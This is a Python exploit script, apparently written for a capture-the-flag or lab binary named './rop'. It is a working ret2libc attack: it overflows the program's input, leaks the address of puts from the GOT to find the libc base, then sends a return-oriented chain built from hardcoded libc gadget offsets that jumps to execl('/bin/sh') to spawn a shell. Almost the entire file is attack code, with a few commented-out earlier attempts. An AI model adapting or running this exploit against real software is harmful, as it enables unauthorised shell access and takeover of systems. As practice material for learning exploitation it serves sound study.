#!/usr/bin/env python3
import struct
import sys
import subprocess as sub


VERBOSE = 2
REMOTE = 0

def trace(*args, **kwargs):
    if VERBOSE > 1: print(*args, file=sys.stderr, flush=True, **kwargs)


def main(fn='./rop'):
    sym_main = 0x080487c9
    leapA = 0x080485e6
    leap2 = 0x080485fd
    leap3 = 0x08048666
    leap3_fix = 0x08048690
    vuln = 0x08048791

    plt_puts = 0x08048460
    got_puts = 0x0804a01c

    pwn = pad(16) + pad(12)

    with sub.Popen([fn], stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.DEVNULL, bufsize=0) as proc:

        s = b''
        while not s.endswith(b'> '):
            s += proc.stdout.read(1)

        if 1:
            pwn += i32(plt_puts)
            pwn += i32(got_puts)
            pwn += i32(sym_main)
            pwn += b'\n'
            proc.stdin.write(pwn)

            # 00067360 T _IO_puts
            libc = proc.stdout.read(4)
            libc, = struct.unpack('<I', libc)
            libc -= 0x00067360
            trace(hex(libc))

            # s = b''
            # while not s.endswith(b'> '):
            #     s += proc.stdout.read(1)

        if 1:
            # libc = 0x41dd92d
            # pop eax ; ret
            pwn = b''
            pwn += i32(libc + 0x00024a67)
            pwn += i32(0)
            # pop ebx ; ret
            pwn += i32(libc + 0x00018be5)
            pwn += i32(libc)
            # execl("/bin/sh", eax)
            pwn += i32(libc + 0x13573e)
            pwn += b'\n'
            proc.stdin.write(pwn)

        r = proc.communicate()
        trace(r)


    # pwn += i32(leapA)
    # pwn += i32(leapA)
    # pwn += i32(leap3_fix)
    # pwn += pad(12)
    # pwn += i32(leap3)
    # sys.stdout.buffer.write(pwn)


def pad(n): return b'\xCC' * n
def i32(x, n=1): return struct.pack('<' + 'I' * n, *[x]*n)


if __name__ == '__main__':
    main(*sys.argv[1:])
